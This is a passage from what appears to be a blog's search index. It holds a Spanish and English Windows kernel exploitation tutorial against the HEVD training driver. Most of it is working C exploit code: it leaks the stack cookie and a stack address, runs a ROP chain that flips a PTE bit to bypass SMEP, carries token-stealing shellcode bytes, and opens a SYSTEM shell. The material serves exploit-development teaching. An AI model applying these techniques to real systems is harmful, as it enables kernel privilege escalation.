el valor almacenado en RSP+0x220 activaremos la mitigación.\nSi reiniciamos el exploit y lo interrumpimos al inicio de TriggerBufferOverflowStackGS, podemos confirmar que la cookie está almacenada en la memoria de HEVD:\nConfirmamos esto aún más cuando lleguemos a la operación XOR. Como se muestra a continuación, podemos ver que es simplemente la dirección de la stack actual, NO un valor codificado de algún tipo.\nSi damos un paso más, podemos ver que este nuevo valor almacenado en RAX se colocará en el stack. Qué pasaría si restauráramos esto una vez corrupto?\nEs posible que tenga problemas durante el análisis con un búfer tan grande, así que continúe y reduzca el tamaño del búfer a 0x900 bytes. Una vez hecho esto, vuelva a ejecutar el experimento anterior y ejecute !analyze -v. Esta vez nuestra cookie final después de la operación XOR es ffff40da07033567 y RSP+0x220 apunta a ffffe58347db76f0, con eso podemos establecer un punto de interrupción en HEVD+0x867b9. En este punto, si continuamos con la ejecución, podemos ver que damos un salto; si continuamos (no lo haremos), terminaríamos llamando a la función __security_check_cookie(). Si volcamos la dirección donde se almacenó la cookie, podremos ver que la hemos dañado. Sin embargo, si lo restauramos y continuamos\u0026hellip;\nObtenemos control sobre el puntero de instrucción :)\nEsto nos da una descripción general sólida de alto nivel sobre cómo podemos evitar esta mitigación.\nHorneando galletas # Entonces, al igual que con otros exploits que hemos escrito a lo largo de este “curso” de HEVD, es posible que esté pensando que esto sería tan simple como obtener la dirección base de HEVD y leer la ubicación de la memoria donde se encontraba la cookie. Sin embargo, rápidamente (obstinadamente) nos enteramos de que este no era el caso. Necesitamos encontrar una leak, en nuestro caso podríamos reutilizar la vulnerabilidad Write-What-Where o Arbitrary Write\u0026hellip;\nEscribamos un PoC y probémoslo.\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;windows.h\u0026gt; #include \u0026lt;psapi.h\u0026gt; #include \u0026lt;ntdef.h\u0026gt; #include \u0026lt;winternl.h\u0026gt; #include \u0026lt;shlwapi.h\u0026gt; /* IOCTL */ #define STACK_OVERFLOW_GS_IOCTL 0x222007 #define ARBITRARY_WRITE_IOCTL 0x22200b /* Structure used by Write-What-Where */ typedef struct _WRITE_WHAT_WHERE { uint64_t *ullpWhat; uint64_t *ullpWhere; } WRITE_WHAT_WHERE, *PWRITE_WHAT_WHERE; /* Exploit Settings */ #define ALLOCATION_SIZE 0x900 /* GetKernelModuleBase(): Function used to obtain kernel module address */ LPVOID GetKernelModuleBase(PCHAR pKernelModule) { char pcDriver[1024] = { 0 }; LPVOID lpvTargetDriver = NULL; LPVOID *lpvDrivers = NULL; DWORD dwCB = 0; DWORD dwDrivers = 0; DWORD i = 0; EnumDeviceDrivers(NULL, dwCB, \u0026amp;dwCB); if (dwCB \u0026lt;= 0) return NULL; lpvDrivers = (LPVOID *)malloc(dwCB * sizeof(LPVOID)); if (lpvDrivers == NULL) return NULL; if (EnumDeviceDrivers(lpvDrivers, dwCB, \u0026amp;dwCB)) { dwDrivers = dwCB / sizeof(LPVOID); for (i = 0; i \u0026lt; dwDrivers; i++) if (GetDeviceDriverBaseNameA(lpvDrivers[i], pcDriver, sizeof(pcDriver))) if (StrStrA(pcDriver, pKernelModule) != NULL) lpvTargetDriver = lpvDrivers[i]; } free(lpvDrivers); return lpvTargetDriver; } /* CheckWin(): Simple function to check if we\u0026#39;re running as SYSTEM */ int CheckWin(VOID) { DWORD win = 0; DWORD dwLen = 0; CHAR *cUsername = NULL; GetUserNameA(NULL, \u0026amp;dwLen); if (dwLen \u0026gt; 0) { cUsername = (CHAR *)malloc(dwLen * sizeof(CHAR)); } else { printf(\u0026#34;[-] Failed to allocate buffer for username check\\n\u0026#34;); return -1; } GetUserNameA(cUsername, \u0026amp;dwLen); win = strcmp(cUsername, \u0026#34;SYSTEM\u0026#34;); free(cUsername); return (win == 0) ? win : -1; } /* GenerateExploitBuffer(): Generate the buffer that will overwrite the return address and grant control over the instruction pointer. */ DWORD GenerateExploitBuffer(LPVOID lpvNt, LPVOID lpvBuffer) { size_t i = 0; uint64_t *payload = (uint64_t *)lpvBuffer; for (i = 0; i \u0026lt; ALLOCATION_SIZE; i += sizeof(uint64_t)) *payload++ = 0x41414141; return i; } /* WriteBytes(): Arbitrary write located in the TriggerArbitraryWrite() function */ void WriteBytes(HANDLE hHEVD, uint64_t* u64What, uint64_t* u64Where) { DWORD dwBytesReturned = 0; WRITE_WHAT_WHERE www = { 0 }; www.ullpWhere = u64Where; www.ullpWhat = u64What; printf(\u0026#34;\\t[*] Writing 0x%p to 0x%p\\n\u0026#34;, www.ullpWhat, www.ullpWhere); DeviceIoControl(hHEVD, ARBITRARY_WRITE_IOCTL, \u0026amp;www, sizeof(WRITE_WHAT_WHERE), NULL, 0x00, \u0026amp;dwBytesReturned, NULL); } /* LeakCookie(): Leverage the ARBITRARY_WRITE_IOCTL to write to our variable in Userland from Kernel Land. */ uint64_t LeakCookie(HANDLE hHEVD, LPVOID lpvHEVD) { uint64_t cookie = 0; uint64_t *pu64Cookie = (uint64_t *)(lpvHEVD + 0x3000); printf(\u0026#34;\\t[*] Cookie located @{0x%p}\\n\u0026#34;, pu64Cookie); WriteBytes(hHEVD, pu64Cookie, \u0026amp;cookie); printf(\u0026#34;\\t[+] Cookie leaked: 0x%p\\n\u0026#34;, cookie); return cookie; } /* Exploit(): Stack Overflow (GS) */ int Exploit(HANDLE hHEVD) { uint64_t cookie = 0x00; DWORD dwExploitBuffer = 0; DWORD dwBytesReturned = 0; LPVOID lpvMemoryAlloc = NULL; LPVOID lpvHEVD = GetKernelModuleBase(\u0026#34;HEVD\u0026#34;); if (lpvHEVD == NULL) { printf(\u0026#34;[-] Failed to obtain the base address of HEVD\\n\u0026#34;); return -1; } printf(\u0026#34;[*] Base address of HEVD @{0x%p}\\n\u0026#34;, lpvHEVD); printf(\u0026#34;[*] Attempting to leak __security_cookie\\n\u0026#34;); cookie = LeakCookie(hHEVD, lpvHEVD); ---snip--- } Una vez enviado, vemos la cookie del stack!\nSin embargo, todavía necesitamos una leak del stack\u0026hellip; Estaba confundido\u0026hellip; hasta que encontré otra publicación de Kristal-G donde el uso un stack leak de sam-b.\nCodifiquemos esto una vez más y probémoslo!\nvoid LeakStack(wchar_t *targetPoC) { HMODULE ntdll = GetModuleHandle(TEXT(\u0026#34;ntdll\u0026#34;)); PNtQuerySystemInformation query = (PNtQuerySystemInformation)GetProcAddress(ntdll, \u0026#34;NtQuerySystemInformation\u0026#34;); if (query == NULL) { printf(\u0026#34;GetProcAddress() failed.\\n\u0026#34;); exit(-1); } ULONG len = 2000; NTSTATUS status = 0x00; PSYSTEM_EXTENDED_PROCESS_INFORMATION pProcessInfo = NULL; do { len *= 2; pProcessInfo = (PSYSTEM_EXTENDED_PROCESS_INFORMATION)GlobalAlloc(GMEM_ZEROINIT, len); status = query(SystemExtendedProcessInformation, pProcessInfo, len, \u0026amp;len); } while (status == (NTSTATUS)0xc0000004); if (status != (NTSTATUS)0x0) { printf(\u0026#34;NtQuerySystemInformation failed with error code 0x%X\\n\u0026#34;, status); exit(-1); } while (pProcessInfo-\u0026gt;NextEntryOffset != 0x00) { // Strangely I was able to do this with the pProcessInfo-\u0026gt;ImageName.Buffer being NULL? if (StrStrW(pProcessInfo-\u0026gt;ImageName.Buffer, targetPoC) != NULL || pProcessInfo-\u0026gt;ImageName.Buffer == NULL) { printf(\u0026#34;[*] Leaking stack from %ls\\n\u0026#34;, targetPoC); for (unsigned int i = 0; i \u0026lt; pProcessInfo-\u0026gt;NumberOfThreads; i++) { LPVOID stackBase = pProcessInfo-\u0026gt;Threads[i].StackBase; LPVOID stackLimit = pProcessInfo-\u0026gt;Threads[i].StackLimit; #ifdef _WIN64 printf(\u0026#34;\\tStack base 0x%p\\tStack limit 0x%p\\n\u0026#34;, stackBase, stackLimit); #else printf(\u0026#34;\\tStack base 0x%X\\t\u0026#34;, stackBase); printf(\u0026#34;\\tStack limit 0x%X\\r\\n\u0026#34;, stackLimit); #endif break; } } if (!pProcessInfo-\u0026gt;NextEntryOffset) { pProcessInfo = NULL; } else { pProcessInfo = (PSYSTEM_EXTENDED_PROCESS_INFORMATION)((ULONG_PTR)pProcessInfo + pProcessInfo-\u0026gt;NextEntryOffset); } } } /* Exploit(): Stack Overflow (GS) */ int Exploit(HANDLE hHEVD) { uint64_t cookie = 0x00; DWORD dwExploitBuffer = 0; DWORD dwBytesReturned = 0; LPVOID lpvStackLeak = NULL; LPVOID lpvMemoryAlloc = NULL; LPVOID lpvHEVD = GetKernelModuleBase(\u0026#34;HEVD\u0026#34;); if (lpvHEVD == NULL) { printf(\u0026#34;[-] Failed to obtain the base address of HEVD\\n\u0026#34;); return -1; } printf(\u0026#34;[*] Base address of HEVD @{0x%p}\\n\u0026#34;, lpvHEVD); printf(\u0026#34;[*] Attempting to leak __security_cookie\\n\u0026#34;); cookie = LeakCookie(hHEVD, lpvHEVD); LeakStack(L\u0026#34;poc.exe\u0026#34;); getchar(); ---snip--- } Como se puede ver en nuestro código, tuvimos muchos problemas para obtener el proceso de destino. Fue extraño, básicamente lo que terminamos viendo fue que pProcessInfor-\u0026gt;ImageName.Buffer necesitaba ser NULL.\nPodemos confirmar esto aún más con WinDbg.\nCon eso deberíamos tener todo lo que necesitamos para explotar esto :)\nExplotación # Código PoC:\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;wchar.h\u0026gt; #include \u0026lt;windows.h\u0026gt; #include \u0026lt;psapi.h\u0026gt; #include \u0026lt;shlwapi.h\u0026gt; typedef LONG KPRIORITY; typedef struct _CLIENT_ID { DWORD UniqueProcess; DWORD UniqueThread; } CLIENT_ID; typedef struct _UNICODE_STRING { USHORT Length; USHORT MaximumLength; #ifdef MIDL_PASS [size_is(MaximumLength / 2), length_is((Length) / 2) ] USHORT * Buffer; #else // MIDL_PASS _Field_size_bytes_part_opt_(MaximumLength, Length) PWCH Buffer; #endif // MIDL_PASS } UNICODE_STRING; typedef UNICODE_STRING *PUNICODE_STRING; typedef const UNICODE_STRING *PCUNICODE_STRING; //from http://boinc.berkeley.edu/android-boinc/boinc/lib/diagnostics_win.h typedef struct _VM_COUNTERS { // the following was inferred by painful reverse engineering SIZE_T PeakVirtualSize; // not actually SIZE_T PageFaultCount; SIZE_T PeakWorkingSetSize; SIZE_T WorkingSetSize; SIZE_T QuotaPeakPagedPoolUsage; SIZE_T QuotaPagedPoolUsage; SIZE_T QuotaPeakNonPagedPoolUsage; SIZE_T QuotaNonPagedPoolUsage; SIZE_T PagefileUsage; SIZE_T PeakPagefileUsage; SIZE_T VirtualSize; // not actually } VM_COUNTERS; typedef enum _KWAIT_REASON { Executive = 0, FreePage = 1, PageIn = 2, PoolAllocation = 3, DelayExecution = 4, Suspended = 5, UserRequest = 6, WrExecutive = 7, WrFreePage = 8, WrPageIn = 9, WrPoolAllocation = 10, WrDelayExecution = 11, WrSuspended = 12, WrUserRequest = 13, WrEventPair = 14, WrQueue = 15, WrLpcReceive = 16, WrLpcReply = 17, WrVirtualMemory = 18, WrPageOut = 19, WrRendezvous = 20, Spare2 = 21, Spare3 = 22, Spare4 = 23, Spare5 = 24, WrCalloutStack = 25, WrKernel = 26, WrResource = 27, WrPushLock = 28, WrMutex = 29, WrQuantumEnd = 30, WrDispatchInt = 31, WrPreempted = 32, WrYieldExecution = 33, WrFastMutex = 34, WrGuardedMutex = 35, WrRundown = 36, MaximumWaitReason = 37 } KWAIT_REASON; typedef struct _SYSTEM_THREAD_INFORMATION { LARGE_INTEGER KernelTime; LARGE_INTEGER UserTime; LARGE_INTEGER CreateTime; ULONG WaitTime; PVOID StartAddress; CLIENT_ID ClientId; KPRIORITY Priority; LONG BasePriority; ULONG ContextSwitchCount; ULONG ThreadState; KWAIT_REASON WaitReason; #ifdef _WIN64 ULONG Reserved[4]; #endif } SYSTEM_THREAD_INFORMATION, *PSYSTEM_THREAD_INFORMATION; typedef struct _SYSTEM_EXTENDED_THREAD_INFORMATION { SYSTEM_THREAD_INFORMATION ThreadInfo; PVOID StackBase; PVOID StackLimit; PVOID Win32StartAddress; PVOID TebAddress; /* This is only filled in on Vista and above */ ULONG Reserved1; ULONG Reserved2; ULONG Reserved3; } SYSTEM_EXTENDED_THREAD_INFORMATION, *PSYSTEM_EXTENDED_THREAD_INFORMATION; typedef struct _SYSTEM_EXTENDED_PROCESS_INFORMATION { ULONG NextEntryOffset; ULONG NumberOfThreads; LARGE_INTEGER SpareLi1; LARGE_INTEGER SpareLi2; LARGE_INTEGER SpareLi3; LARGE_INTEGER CreateTime; LARGE_INTEGER UserTime; LARGE_INTEGER KernelTime; UNICODE_STRING ImageName; KPRIORITY BasePriority; ULONG ProcessId; ULONG InheritedFromUniqueProcessId; ULONG HandleCount; ULONG SessionId; PVOID PageDirectoryBase; VM_COUNTERS VirtualMemoryCounters; SIZE_T PrivatePageCount; IO_COUNTERS IoCounters; SYSTEM_EXTENDED_THREAD_INFORMATION Threads[1]; } SYSTEM_EXTENDED_PROCESS_INFORMATION, *PSYSTEM_EXTENDED_PROCESS_INFORMATION; typedef enum _SYSTEM_INFORMATION_CLASS { SystemExtendedProcessInformation = 57 } SYSTEM_INFORMATION_CLASS; typedef NTSTATUS(WINAPI *PNtQuerySystemInformation)( __in SYSTEM_INFORMATION_CLASS SystemInformationClass, __inout PVOID SystemInformation, __in ULONG SystemInformationLength, __out_opt PULONG ReturnLength ); /* IOCTL */ #define STACK_OVERFLOW_GS_IOCTL 0x222007 #define ARBITRARY_WRITE_IOCTL 0x22200b /* Structure used by Write-What-Where */ typedef struct _WRITE_WHAT_WHERE { uint64_t *ullpWhat; uint64_t *ullpWhere; } WRITE_WHAT_WHERE, *PWRITE_WHAT_WHERE; /* Exploit Settings */ #define ALLOCATION_SIZE 0x900 /* GetKernelModuleBase(): Function used to obtain kernel module address */ LPVOID GetKernelModuleBase(PCHAR pKernelModule) { char pcDriver[1024] = { 0 }; LPVOID lpvTargetDriver = NULL; LPVOID *lpvDrivers = NULL; DWORD dwCB = 0; DWORD dwDrivers = 0; DWORD i = 0; EnumDeviceDrivers(NULL, dwCB, \u0026amp;dwCB); if (dwCB \u0026lt;= 0) return NULL; lpvDrivers = (LPVOID *)malloc(dwCB * sizeof(LPVOID)); if (lpvDrivers == NULL) return NULL; if (EnumDeviceDrivers(lpvDrivers, dwCB, \u0026amp;dwCB)) { dwDrivers = dwCB / sizeof(LPVOID); for (i = 0; i \u0026lt; dwDrivers; i++) if (GetDeviceDriverBaseNameA(lpvDrivers[i], pcDriver, sizeof(pcDriver))) if (StrStrA(pcDriver, pKernelModule) != NULL) lpvTargetDriver = lpvDrivers[i]; } free(lpvDrivers); return lpvTargetDriver; } /* CheckWin(): Simple function to check if we\u0026#39;re running as SYSTEM */ int CheckWin(VOID) { DWORD win = 0; DWORD dwLen = 0; CHAR *cUsername = NULL; GetUserNameA(NULL, \u0026amp;dwLen); if (dwLen \u0026gt; 0) { cUsername = (CHAR *)malloc(dwLen * sizeof(CHAR)); } else { printf(\u0026#34;[-] Failed to allocate buffer for username check\\n\u0026#34;); return -1; } GetUserNameA(cUsername, \u0026amp;dwLen); win = strcmp(cUsername, \u0026#34;SYSTEM\u0026#34;); free(cUsername); return (win == 0) ? win : -1; } /* GenerateExploitBuffer(): Generate the buffer that will overwrite the return address and grant control over the instruction pointer. */ DWORD GenerateExploitBuffer(LPVOID lpvNt, LPVOID lpvStackLeak, uint64_t cookie, LPVOID lpvBuffer) { size_t j = 0; size_t i = 0; LPVOID shellcode = NULL; uint64_t nt = (uint64_t)(lpvNt); uint64_t stack = (uint64_t)(lpvStackLeak); uint64_t *payload = (uint64_t *)(lpvBuffer); uint8_t sc[129] = { // sickle-tool -p windows/x64/kernel_token_stealer -f num (58 bytes) 0x65, 0x48, 0xa1, 0x88, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x80, 0xb8, 0x00, 0x00, 0x00, 0x48, 0x89, 0xc1, 0xb2, 0x04, 0x48, 0x8b, 0x80, 0x48, 0x04, 0x00, 0x00, 0x48, 0x2d, 0x48, 0x04, 0x00, 0x00, 0x38, 0x90, 0x40, 0x04, 0x00, 0x00, 0x75, 0xeb, 0x48, 0x8b, 0x90, 0xb8, 0x04, 0x00, 0x00, 0x48, 0x89, 0x91, 0xb8, 0x04, 0x00, 0x00, // sickle-tool -p windows/x64/kernel_sysret -f num (71) 0x65, 0x48, 0xa1, 0x88, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x66, 0x8b, 0x88, 0xe4, 0x01, 0x00, 0x00, 0x66, 0xff, 0xc1, 0x66, 0x89, 0x88, 0xe4, 0x01, 0x00, 0x00, 0x48, 0x8b, 0x90, 0x90, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x8a, 0x68, 0x01, 0x00, 0x00, 0x4c, 0x8b, 0x9a, 0x78, 0x01, 0x00, 0x00, 0x48, 0x8b, 0xa2, 0x80, 0x01, 0x00, 0x00, 0x48, 0x8b, 0xaa, 0x58, 0x01, 0x00, 0x00, 0x31, 0xc0, 0x0f, 0x01, 0xf8, 0x48, 0x0f, 0x07 }; shellcode = VirtualAlloc(NULL, sizeof(sc), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); if (shellcode == NULL) { printf(\u0026#34;[-] Failed to allocate memory for shellcode\\n\u0026#34;); return -1; } RtlCopyMemory(shellcode, sc, 129); /* Adjust the stack pointer */ stack -= 0xb30; printf(\u0026#34;\\t[*] Writing stack cookie @{0x%p}\\n\u0026#34;, stack); /* Overflow past the size of the buffer */ for (i = 0; i \u0026lt; (512 / sizeof(uint64_t)); i++) { payload[i] = 0x4141414141414141; } payload[i++] = (stack ^ cookie); /* Stack Cookie */ /* Offset to shellcode start */ payload[i++] = 0x4343434343434343; payload[i++] = 0x4444444444444444; payload[i++] = 0x4545454545454545; payload[i++] = 0x4646464646464646; payload[i++] = 0x4747474747474747; payload[i++] = 0x4848484848484848; /* Prepare RDX register for later. This is needed for the XOR operation */ payload[i++] = nt + 0x40ed4e; // pop rdx ; pop rax ; pop rcx ; ret payload[i++] = 0x000008; // Set RDX to 0x08, we will need this to accomplish the XOR payload[i++] = 0x000000; // [filler] payload[i++] = 0x000000; // [filler] /* Setup the call to MiGetPteAddress in order to get the address of the PTE for our userland code. The setup is as follows: RAX -\u0026gt; VOID *MiGetPteAddress( ( RCX == PTE / Userland Code ) ); Once the call is complete RAX should contain the pointer to our PTE. */ payload[i++] = nt + 0x57699c; // pop rcx ; ret payload[i++] = (uint64_t)shellcode; // *shellcode payload[i++] = nt + 0x24aaec; // MiGetPteAddress() /* Now that we have obtained the PTE address, we can modify the 2nd bit in order to mark the page as a kernel page (U -\u0026gt; K). We can do this using XOR ;) */ payload[i++] = nt + 0x30fcf3; // sub rax, rdx ; ret payload[i++] = nt + 0x54f344; // push rax ; pop rbx ; ret payload[i++] = nt + 0x40ed4e; // pop rdx ; pop rax ; pop rcx ; ret payload[i++] = 0x000004; // 0x40ed4e: pop rdx ; pop rax ; pop rcx ; ret ; (1 found) payload[i++] = 0x000000; // [filler] payload[i++] = 0x000000; // [filler] payload[i++] = nt + 0x3788b6; // xor [rbx+0x08], edx ; mov rbx, qword [rsp+0x60] ; add rsp, 0x40 ; pop r14 ; pop rdi ; pop rbp ; ret /* Now we cam spray our shellcode address since SMEP and VPS should be bypassed */ for (j = 0; j \u0026lt; 0xC; j++) { payload[i++] = (uint64_t)shellcode; } printf(\u0026#34;\\t[*] Generated %d bytes ...\\n\u0026#34;, (i * sizeof(uint64_t))); return (i * sizeof(uint64_t)); } /* WriteBytes(): Arbitrary write located in the TriggerArbitraryWrite() function */ void WriteBytes(HANDLE hHEVD, uint64_t* u64What, uint64_t* u64Where) { DWORD dwBytesReturned = 0; WRITE_WHAT_WHERE www = { 0 }; www.ullpWhere = u64Where; www.ullpWhat = u64What; printf(\u0026#34;\\t[*] Writing 0x%p to 0x%p\\n\u0026#34;, www.ullpWhat, www.ullpWhere); DeviceIoControl(hHEVD, ARBITRARY_WRITE_IOCTL, \u0026amp;www, sizeof(WRITE_WHAT_WHERE), NULL, 0x00, \u0026amp;dwBytesReturned, NULL); } /* LeakCookie(): Leverage the ARBITRARY_WRITE_IOCTL to write to our variable in Userland from Kernel Land. */ uint64_t LeakCookie(HANDLE hHEVD, LPVOID lpvHEVD) { uint64_t cookie = 0; uint64_t *pu64Cookie = (uint64_t *)(lpvHEVD + 0x3000); printf(\u0026#34;\\t[*] Cookie located @{0x%p}\\n\u0026#34;, pu64Cookie); WriteBytes(hHEVD, pu64Cookie, \u0026amp;cookie); printf(\u0026#34;\\t[+] Cookie leaked: 0x%p\\n\u0026#34;, cookie); return cookie; } void LeakStack(wchar_t *targetPoC, LPVOID *lpvStackLeak) { HMODULE ntdll = GetModuleHandle(TEXT(\u0026#34;ntdll\u0026#34;)); PNtQuerySystemInformation query = (PNtQuerySystemInformation)GetProcAddress(ntdll, \u0026#34;NtQuerySystemInformation\u0026#34;); if (query == NULL) { printf(\u0026#34;GetProcAddress() failed.\\n\u0026#34;); exit(-1); } ULONG len = 2000; NTSTATUS status = 0x00; PSYSTEM_EXTENDED_PROCESS_INFORMATION pProcessInfo = NULL; do { len *= 2; pProcessInfo = (PSYSTEM_EXTENDED_PROCESS_INFORMATION)GlobalAlloc(GMEM_ZEROINIT, len); status = query(SystemExtendedProcessInformation, pProcessInfo, len, \u0026amp;len); } while (status == (NTSTATUS)0xc0000004); if (status != (NTSTATUS)0x0) { printf(\u0026#34;NtQuerySystemInformation failed with error code 0x%X\\n\u0026#34;, status); exit(-1); } LPVOID stackBase = NULL; LPVOID stackLimit = NULL; while (pProcessInfo-\u0026gt;NextEntryOffset != 0x00) { // Strangely I was able to do this with the pProcessInfo-\u0026gt;ImageName.Buffer being NULL? if (StrStrW(pProcessInfo-\u0026gt;ImageName.Buffer, targetPoC) != NULL) { printf(\u0026#34;[*] Leaking stack from %ls\\n\u0026#34;, targetPoC); for (unsigned int i = 0; i \u0026lt; pProcessInfo-\u0026gt;NumberOfThreads; i++) { stackBase = pProcessInfo-\u0026gt;Threads[i].StackBase; stackLimit = pProcessInfo-\u0026gt;Threads[i].StackLimit; #ifdef _WIN64 printf(\u0026#34;\\t[*] Stack base 0x%p\\tStack limit 0x%p\\n\u0026#34;, stackBase, stackLimit); #else printf(\u0026#34;\\t[*] Stack base 0x%X\\tStack limit 0x%X\\n\u0026#34;, stackBase, stackLimit); #endif break; } } if (!pProcessInfo-\u0026gt;NextEntryOffset) { pProcessInfo = NULL; } else { pProcessInfo = (PSYSTEM_EXTENDED_PROCESS_INFORMATION)((ULONG_PTR)pProcessInfo + pProcessInfo-\u0026gt;NextEntryOffset); } } *lpvStackLeak = stackBase; } /* Exploit(): Stack Overflow (GS) */ int Exploit(HANDLE hHEVD) { uint64_t cookie = 0x00; DWORD dwExploitBuffer = 0; DWORD dwBytesReturned = 0; LPVOID lpvStackLeak = NULL; LPVOID lpvMemoryAlloc = NULL; LPVOID lpvHEVD = GetKernelModuleBase(\u0026#34;HEVD\u0026#34;); LPVOID lpvNtKrnl = GetKernelModuleBase(\u0026#34;ntoskrnl\u0026#34;); if (lpvHEVD == NULL) { printf(\u0026#34;[-] Failed to obtain the base address of HEVD\\n\u0026#34;); return -1; } if (lpvNtKrnl == NULL) { printf(\u0026#34;[-] Failed to obtain the base address of ntoskrnl\\n\u0026#34;); return -1; } printf(\u0026#34;[*] Exploitation started....\\n\u0026#34;); printf(\u0026#34;[*] Base address of HEVD @{0x%p}\\n\u0026#34;, lpvHEVD); printf(\u0026#34;[*] Base address of NT @{0x%p}\\n\u0026#34;, lpvNtKrnl); printf(\u0026#34;[*] Attempting to leak __security_cookie\\n\u0026#34;); cookie = LeakCookie(hHEVD, lpvHEVD); if (cookie == 0x00) { printf(\u0026#34;[-] Failed to leak stack cookie\\n\u0026#34;); } /* I found I need to hammer the stack leak to get it to work :| */ while (1) { LeakStack(L\u0026#34;poc.exe\u0026#34;, \u0026amp;lpvStackLeak); if (lpvStackLeak != NULL) { break; } } if (lpvStackLeak == NULL) { printf(\u0026#34;[-] Failed to leak stack address\\n\u0026#34;); return -1; } lpvMemoryAlloc = VirtualAlloc(NULL, ALLOCATION_SIZE, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE); if (lpvMemoryAlloc == NULL) { printf(\u0026#34;[*] Failed to create exploitation buffer\\n\u0026#34;); return -1; } dwExploitBuffer = GenerateExploitBuffer(lpvNtKrnl, lpvStackLeak, cookie, lpvMemoryAlloc); printf(\u0026#34;[*] Sending payload!!!\\n\u0026#34;, dwExploitBuffer); DeviceIoControl(hHEVD, STACK_OVERFLOW_GS_IOCTL, lpvMemoryAlloc, dwExploitBuffer, NULL, 0x00, \u0026amp;dwBytesReturned, NULL); return CheckWin(); } int main() { HANDLE hHEVD = NULL; hHEVD = CreateFileA(\u0026#34;\\\\\\\\.\\\\HackSysExtremeVulnerableDriver\u0026#34;, (GENERIC_READ | GENERIC_WRITE), 0x00, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); if (hHEVD == NULL) { printf(\u0026#34;[-] Failed to get a handle on HackSysExtremeVulnerableDriver\\n\u0026#34;); return -1; } if (Exploit(hHEVD) == 0) { printf(\u0026#34;[*] Exploitation success!!! Enjoy de shell!!\\n\\n\u0026#34;); system(\u0026#34;cmd.exe\u0026#34;); } else { printf(\u0026#34;[-] Exploitation failed, run again\\n\u0026#34;); } if (hHEVD != INVALID_HANDLE_VALUE) { CloseHandle(hHEVD); } } Una vez enviados, obtenemos nuestra sesión privilegiada!\nRecursos # https://kristal-g.github.io/2021/02/07/HEVD_StackOverflowGS_Windows_10_RS5_x64.html https://github.com/sam-b/windows_kernel_address_leaks/tree/3810bec445c0afaa4e23338241ba0359aea398d1 ","date":"9 February 2025","externalUrl":null,"permalink":"/posts/0x09-el-regreso-del-stack-overflow/","section":"Posts","summary":"","title":"0x09 - El regreso del Windows Kernel Stack Overflow","type":"posts"},{"content":" ₍₍ (ง ˙ω˙)ว ⁾⁾ Hablas Español? Empújame! In the last tutorial we exploited one of the most notorious bug classes in the entire industry - Race Conditions.\nIn this tutorial we’re going back to a bug class we have exploited before - The Stack Overflow. However, this time we’ll be encountering an exploit mitigation known as stack cookies or canaries. That said, we’ll be skipping Windows 7 (x86) and jumping directly into Windows 11 (x64).\nIt’s important to note that the core issue in relation to the security vulnerability HAS NOT changed we’ll still be exploiting a Stack Overflow.\nLet\u0026rsquo;s jump into a high-level overview :)\nTable of Contents # What are Stack Cookies (High Level) Reverse Engineering Crafting a PoC Mitigation Analysis Baking Cookies Exploitation Sources What are Stack Cookies (High Level) # Cookies are likely one of your favorite sugary snacks, however in the context of Cyber Security this is normally a term used by exploit developers in regard to a security mitigation designed to prevent buffer overflows (also known as stack overflows). Before diving into any technical details this is best understood with a high-level overview.\nImagine you have just gone to a family outing and brought chocolate chip cookies from the store for others to eat. These cookies are from REDACTED so everyone is excited to dig in!\nHowever, your aunt makes it clear: “everyone must eat dinner before dessert”. Little do you know your aunt is jealous. Your cookies have become the star of the show! Since you’ve let her know hours prior to arriving you would be bringing these cookies, she cooked a batch indistinguishable from REDACTED’s cookies.\nHowever, she\u0026rsquo;s added one extra ingredient\u0026hellip;\nWith everyone distracted eating dinner, your aunt swaps the cookies you brought for her own. It looks like her carne asada will once again be the star of the cookout.\nOnce everyone finished their meals, they went in for some delicious chocolate chip cookies. However, it looks like your aunt\u0026rsquo;s plan failed since everyone immediately tastes the raisins and REDACTED does not make raisin cookies!\nHow does this relate to exploit mitigations?\nIn this scenario you and your family would be the stack / operating system (OS) and the cookies would be the stack cookies (or canary). Your aunt would be the attacker. The cookie swap could be looked at as the stack overflow Since these cookies are unique (chocolate chip) you and your family would be easily able to identify these are not from REDACTED. In a very similar fashion this is what the exploit mitigation does.\nYou see, when you exploit a stack overflow you are corrupting memory this includes variables, structures, etc. With this mitigation a “cookie” or value is added onto the stack.\nThe way programs work is that when an application returns from a function call and execution is directed to a return address the application will perform a check to ensure the cookie (value) has not been corrupted (assuming the mitigation is enabled). Should the application or OS detect modification of this value often the operating system or application will crash - however, not in a way that benefits an attacker.\nIf we cannot find a way to avoid this from happening (e.g using a leak), we will more than likely not be able to exploit this vulnerability.\nOf course, there are many ways to bypass any mitigation and today we will be doing just that!\nIn fact, you may already be thinking \u0026ldquo;what if our aunt used chocolate chips and not raisins\u0026rdquo;?\nReverse Engineering # As with previous vulnerabilities we’ll need to gather information prior to starting exploitation: the IOCTL code (0x222007) and the vulnerable function. This is pretty easy to spot since HEVD comes with symbols and functions conveniently named so we can learn more about these bug classes.\nBased on the decompilation shown above we won’t be dealing with any custom structures, meaning we can proceed to take a look at the TriggerBufferOverflowStackGS function.\nLooking at the above de-compilation, we can see that the cookie gets stored in the pseudo variable local_38, then we call __security_check_cookie() when exiting the function. As for the core vulnerability - we know this is a vanilla buffer overflow based on the memcpy() copying any buffer into pseudo code array variable local_238[]. Let\u0026rsquo;s go ahead and craft a proof of concept to see what happens when we trigger this vulnerability.\nCrafting a PoC # Since we’re dealing with a vanilla stack overflow there’s no need to really overcomplicate this. Let’s dish out a PoC!\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;windows.h\u0026gt; #include \u0026lt;psapi.h\u0026gt; #include \u0026lt;ntdef.h\u0026gt; #include \u0026lt;winternl.h\u0026gt; #include 